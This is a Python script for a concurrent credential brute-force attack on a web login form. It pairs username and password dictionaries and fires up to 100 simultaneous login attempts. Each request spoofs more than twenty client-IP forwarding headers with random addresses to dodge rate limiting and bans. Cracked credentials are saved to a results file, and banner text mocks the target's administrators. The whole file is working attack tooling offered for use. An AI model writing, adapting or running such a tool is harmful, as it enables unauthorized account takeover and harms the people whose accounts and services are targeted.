import aiohttp
import aiofiles
import asyncio
import time
import random
from colorama import Fore, Style
from aiostream import stream
import sys

target_url = ""# URL
username_file = "TrueUser.txt"#用户名字典
password_file = "PasswordMAXls.txt"#密码字典
result_file = "KillROOT.txt"#保存到这里
max_concurrency = 100
max_retries = 2
retry_delay = 5
ip_change_interval = 10  # 每10次请求切换一次IP

BLUE = Fore.BLUE
CYAN = Fore.CYAN
WHITE = Fore.WHITE
RED = Fore.RED
GREEN = Fore.GREEN
PURPLE = Fore.MAGENTA
ENDC = Style.RESET_ALL


def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


def save_true_user(username):
    with open(result_file, "a") as file:
        file.write(username + "\n")


banner = r"""
   _____   ____  __.  ._.  __________                                               .___
  /  _  \ |    |/ _|  | |  \______   \_____    ______ ________  _  _____________  __| _/
 /  /_\  \|      <    |_|   |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | 
/    |    \    |  \   |-|   |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | 
\____|__  /____|__ \  | |   |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ | 
|       \/        \/  |_|                  \/     \/     \/                          \/ 
|__Ak     |__手术刀
|__7Bash  |__ICE
|_________|_______Bleeding from heart❤️
"""

banners = [
    f"{Fore.BLUE}{banner}{ENDC}",
    f"{Fore.CYAN}{banner}{ENDC}",
    f"{Fore.RED}{banner}{ENDC}",
    f"{Fore.GREEN}{banner}{ENDC}",
    f"{Fore.MAGENTA}{banner}{ENDC}"
]

selected_banner = random.choice(banners)
print(selected_banner)


def save_successful_login(username, password):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    with open(result_file, "a") as file:
        file.write(f"{username} {password} {target_url} {timestamp}\n")


async def hydra_brute_force(username, password, session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Referer": "",# POST必要参数自己写
        "X-Forwarded-For": generate_random_ip(),
        "X-Forwarded": generate_random_ip(),
        "Forwarded-For": generate_random_ip(),
        "Forwarded": generate_random_ip(),
        "X-Forwarded-Proto": "https",
        "X-Forwarded-Host": "",# POST必要参数自己写
        "X-Remote-Ip": generate_random_ip(),
        "X-Remote-Addr": generate_random_ip(),
        "True-Client-Ip": generate_random_ip(),
        "X-Client-Ip": generate_random_ip(),
        "Client-Ip": generate_random_ip(),
        "X-Real-Ip": generate_random_ip(),
        "Ali-Cdn-Real-Ip": generate_random_ip(),
        "Cdn-Src-Ip": generate_random_ip(),
        "Cdn-Real-Ip": generate_random_ip(),
        "Cf-Connecting-Ip": generate_random_ip(),
        "X-Cluster-Client-Ip": generate_random_ip(),
        "Wl-Proxy-Client-Ip": generate_random_ip(),
        "Proxy-Client-Ip": generate_random_ip(),
        "Fastly-Client-Ip": generate_random_ip(),
        "True-Client-Ip": generate_random_ip(),
        "X-Originating-Ip": generate_random_ip(),
        "X-Host": "",# POST必要参数自己写
        "X-Custom-Ip-Authorization": generate_random_ip()
    }

    payload = {
        "mobile": username,
        "password": password,
        "data_type": "mobile"
    }

    retries = 0
    while retries < max_retries:
        try:
            async with session.post(target_url, data=payload, headers=headers) as response:
                if response.status == 200:
                    if response.content_length == 0:
                        print(f"{PURPLE}|____Stupid administrator!")
                    else:
                        json_data = await response.json()
                        if "status" in json_data and json_data["status"] == 1:
                            save_successful_login(username, password)
                            print(
                                f"{RED}|____|____Stupid administrator!☠️ {username} {password}{ENDC}")
                        elif "status" in json_data and json_data["status"] == 2:
                            print(
                                f"{BLUE}|____|____Password incorrect for {username} {password}{ENDC}")
                return
        except aiohttp.ClientError as e:
            print(f"{WHITE}\n|\n|__Error ☠️ username: {username}{ENDC}")
            retries += 1
            await asyncio.sleep(retry_delay)
            if hasattr(e, "response") and e.response is not None:
                if e.response.status == 403:
                    print(f"|___________IP banned by the server")
                else:
                    print(
                        f"|___________Current network error! Unable to connect to the server")
                print(await e.response.text())

    print(f"\nMax retries exceeded for username: {username}. Skipping...")
    print(f"|_", end="", flush=True)


async def process_username_password(username, password, session):
    await hydra_brute_force(username, password, session)
    await asyncio.sleep(0.1)


async def main():
    usernames = []
    with open(username_file, "r") as file:
        for line in file:
            username = line.strip()
            if username.isdigit():
                usernames.append(username)

    async with aiohttp.ClientSession() as session:
        sem = asyncio.Semaphore(max_concurrency)

        async def process_username(username):
            async with sem:
                async with aiofiles.open(password_file, mode='r') as file:
                    async for password in file:
                        password = password.strip()
                        await process_username_password(username, password, session)

        tasks = [process_username(username) for username in usernames]
        await asyncio.gather(*tasks)

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
loop.close()

